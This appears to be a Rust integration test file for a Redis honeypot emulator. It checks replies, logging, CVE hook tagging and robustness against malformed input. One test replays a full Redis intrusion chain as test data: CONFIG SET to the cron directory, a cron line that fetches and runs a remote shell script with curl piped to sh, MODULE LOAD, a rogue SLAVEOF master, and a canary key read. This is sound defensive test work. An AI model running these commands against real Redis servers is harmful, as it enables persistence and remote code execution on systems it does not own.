//! The Redis emulator over a real loopback socket.

mod common;

use std::time::{Duration, Instant};

use foiled_core::capture::{Channel, HookStage, Severity};
use foiled_emulators::redis::RedisEmulator;
use foiled_emulators::{Emulator, Health, Jitter, Rng};
use serde_json::json;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

fn resp(parts: &[&str]) -> Vec<u8> {
    let mut out = format!("*{}\r\n", parts.len()).into_bytes();
    for p in parts {
        out.extend(format!("${}\r\n{p}\r\n", p.len()).into_bytes());
    }
    out
}

async fn read_to_end(s: &mut TcpStream) -> String {
    let mut out = Vec::new();
    tokio::time::timeout(Duration::from_secs(5), s.read_to_end(&mut out))
        .await
        .expect("server closes in time")
        .unwrap();
    String::from_utf8_lossy(&out).into_owned()
}

#[tokio::test]
async fn config_rewrite_chain_is_answered_and_recorded() {
    let mut emu = RedisEmulator::new();
    let (addr, mut rx) = common::start(&mut emu, &common::rendered("redis-7.0")).await;
    let mut s = TcpStream::connect(addr).await.unwrap();

    let mut req = Vec::new();
    for c in [
        &["PING"][..],
        &["CONFIG", "SET", "dir", "/var/spool/cron"],
        &["CONFIG", "SET", "dbfilename", "root"],
        &[
            "SET",
            "x",
            "\n\n*/1 * * * * curl -fsSL http://198.51.100.9/a.sh | sh\n\n",
        ],
        &["SAVE"],
        &["MODULE", "LOAD", "/tmp/exp.so"],
        &["SLAVEOF", "192.0.2.10", "8886"],
        &["GET", "billing:worker:api_key"],
        &["DBSIZE"],
    ] {
        req.extend(resp(c));
    }
    // An inline command, as `nc` users send.
    req.extend_from_slice(b"QUIT\r\n");
    s.write_all(&req).await.unwrap();
    let reply = read_to_end(&mut s).await;
    assert_eq!(
        reply,
        concat!(
            "+PONG\r\n",
            "+OK\r\n",
            "+OK\r\n",
            "+OK\r\n",
            "+OK\r\n",
            "-ERR Error loading the extension. Please check the server logs.\r\n",
            "+OK\r\n",
            "$20\r\ncnry-billing_api_key\r\n",
            ":5\r\n",
            "+OK\r\n",
        )
    );

    // 10 application events and 4 hook events.
    let events = common::collect(&mut rx, 14).await;
    assert_eq!(events.len(), 14);
    common::assert_valid(&events);
    let app: Vec<_> = events
        .iter()
        .filter(|e| e.channel == Channel::Application)
        .collect();
    let hooks: Vec<_> = events
        .iter()
        .filter(|e| e.channel == Channel::Hook)
        .collect();
    assert_eq!(app.len(), 10);
    let commands: Vec<&str> = app
        .iter()
        .map(|e| e.data["command"].as_str().unwrap())
        .collect();
    assert_eq!(
        commands,
        [
            "PING", "CONFIG", "CONFIG", "SET", "SAVE", "MODULE", "SLAVEOF", "GET", "DBSIZE", "QUIT"
        ]
    );
    assert_eq!(app[1].severity, Severity::High);
    assert_eq!(app[1].data["config_set"], json!({"dir": "/var/spool/cron"}));
    assert_eq!(app[3].data["markers"], json!(["cron_line", "url", "shell"]));
    assert_eq!(app[4].data["save_path"], json!("/var/spool/cron/root"));
    assert_eq!(app[5].data["module_path"], json!("/tmp/exp.so"));
    assert_eq!(app[6].data["master_host"], json!("192.0.2.10"));
    for e in &app {
        assert_eq!(e.src.ip, "127.0.0.1");
        assert_eq!(e.dst.as_ref().unwrap().port, Some(addr.port()));
        assert_eq!(e.data["protocol"], json!("redis"));
        assert_eq!(e.data["session"], app[0].data["session"]);
    }
    // The SET payload is hashed, not stored.
    assert!(
        !serde_json::to_string(&events)
            .unwrap()
            .contains("198.51.100.9")
    );

    let ids: Vec<&str> = hooks
        .iter()
        .map(|e| e.hook.as_ref().unwrap().hook_id.as_str())
        .collect();
    assert_eq!(
        ids,
        [
            "redis.config-set-persistence",
            "redis.config-set-persistence",
            "redis.module-load",
            "redis.replicaof"
        ]
    );
    let first = hooks[0].hook.as_ref().unwrap();
    assert_eq!(first.cve_id.as_deref(), Some("CVE-2099-0001"));
    assert_eq!(first.catalogue_id, "emulator/redis/7.0");
    assert_eq!(first.stage, HookStage::Trigger);
    let seqs: Vec<u32> = hooks
        .iter()
        .map(|e| e.hook.as_ref().unwrap().sequence_no)
        .collect();
    assert_eq!(seqs, [1, 2, 3, 4]);

    emu.stop().await;
}

#[tokio::test]
async fn info_over_the_wire_carries_the_banner_and_replica_state() {
    let mut emu = RedisEmulator::new();
    let (addr, _rx) = common::start(&mut emu, &common::rendered("redis-7.0")).await;
    let mut s = TcpStream::connect(addr).await.unwrap();
    let mut req = resp(&["SLAVEOF", "192.0.2.10", "8886"]);
    req.extend(resp(&["INFO"]));
    req.extend(resp(&["QUIT"]));
    s.write_all(&req).await.unwrap();
    let reply = read_to_end(&mut s).await;
    let body_start = reply.find("$").unwrap();
    let header_end = reply[body_start..].find("\r\n").unwrap() + body_start;
    let len: usize = reply[body_start + 1..header_end].parse().unwrap();
    let info = &reply[header_end + 2..header_end + 2 + len];
    assert!(info.starts_with("# Server\r\nredis_version:7.0.11\r\n"));
    assert!(info.contains(&format!("tcp_port:{}\r\n", addr.port())));
    assert!(info.contains(
        "role:slave\r\nmaster_host:192.0.2.10\r\nmaster_port:8886\r\nmaster_link_status:down\r\n"
    ));
    assert!(info.contains("# Keyspace\r\ndb0:keys=4,expires=0,avg_ttl=0\r\n"));
    common::assert_no_tells(info, "INFO");
    emu.stop().await;
}

#[tokio::test]
async fn malformed_input_gets_the_redis_error_and_a_closed_connection() {
    let mut emu = RedisEmulator::new();
    let (addr, mut rx) = common::start(&mut emu, &common::rendered("redis-7.0")).await;

    for (input, expected) in [
        (
            &b"*1\r\n$999999999\r\n"[..],
            "-ERR Protocol error: invalid bulk length\r\n",
        ),
        (
            &b"*1\r\n:1\r\n"[..],
            "-ERR Protocol error: expected '$', got ':'\r\n",
        ),
        (
            &b"GET \"unterminated\r\n"[..],
            "-ERR Protocol error: unbalanced quotes in request\r\n",
        ),
    ] {
        let mut s = TcpStream::connect(addr).await.unwrap();
        s.write_all(input).await.unwrap();
        let reply = read_to_end(&mut s).await;
        assert_eq!(reply, expected);
    }
    let events = common::collect(&mut rx, 3).await;
    assert_eq!(events.len(), 3);
    common::assert_valid(&events);
    assert!(
        events
            .iter()
            .all(|e| e.data["result"] == json!("protocol_error"))
    );
    assert!(matches!(emu.health(), Health::Serving { .. }));
    emu.stop().await;
}

#[tokio::test]
async fn random_garbage_never_takes_the_server_down() {
    let mut emu = RedisEmulator::new();
    let (addr, mut rx) = common::start(&mut emu, &common::rendered("redis-7.0")).await;
    let mut rng = Rng::seeded(0x5EED);
    for _ in 0..40 {
        let mut s = TcpStream::connect(addr).await.unwrap();
        let len = rng.range(1, 4096) as usize;
        let bytes: Vec<u8> = (0..len).map(|_| rng.next_u64() as u8).collect();
        let _ = s.write_all(&bytes).await;
        let _ = s.shutdown().await;
        let mut sink = Vec::new();
        let _ = tokio::time::timeout(Duration::from_secs(5), s.read_to_end(&mut sink)).await;
    }
    // Still serving, still answering.
    assert!(matches!(emu.health(), Health::Serving { .. }));
    let mut s = TcpStream::connect(addr).await.unwrap();
    s.write_all(b"PING\r\nQUIT\r\n").await.unwrap();
    assert_eq!(read_to_end(&mut s).await, "+PONG\r\n+OK\r\n");
    while let Ok(Some(ev)) = tokio::time::timeout(Duration::from_millis(200), rx.recv()).await {
        common::assert_valid(&[ev]);
    }
    emu.stop().await;
}

#[tokio::test]
async fn jitter_delays_replies_when_configured() {
    let mut profile = common::rendered("redis-7.0");
    profile.jitter = Jitter {
        min_ms: 40,
        max_ms: 60,
    };
    let mut emu = RedisEmulator::new();
    let (addr, _rx) = common::start(&mut emu, &profile).await;
    let mut s = TcpStream::connect(addr).await.unwrap();
    let start = Instant::now();
    s.write_all(b"PING\r\n").await.unwrap();
    let mut buf = [0u8; 7];
    s.read_exact(&mut buf).await.unwrap();
    assert_eq!(&buf, b"+PONG\r\n");
    assert!(start.elapsed() >= Duration::from_millis(40));
    emu.stop().await;
}
